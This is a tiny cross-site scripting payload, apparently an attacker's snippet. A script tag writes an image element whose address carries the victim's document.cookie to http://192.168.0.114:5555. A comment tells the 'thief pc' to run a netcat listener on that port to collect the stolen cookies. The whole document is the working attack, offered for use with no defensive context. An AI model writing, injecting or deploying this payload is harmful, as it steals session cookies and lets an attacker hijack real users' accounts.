<script>
	document.write(
	'<img src=http://192.168.0.114:5555?c='+ escape(document.cookie) + ' >'
	);
</script>

// on the thief pc run this
// nc -l 5555 -v
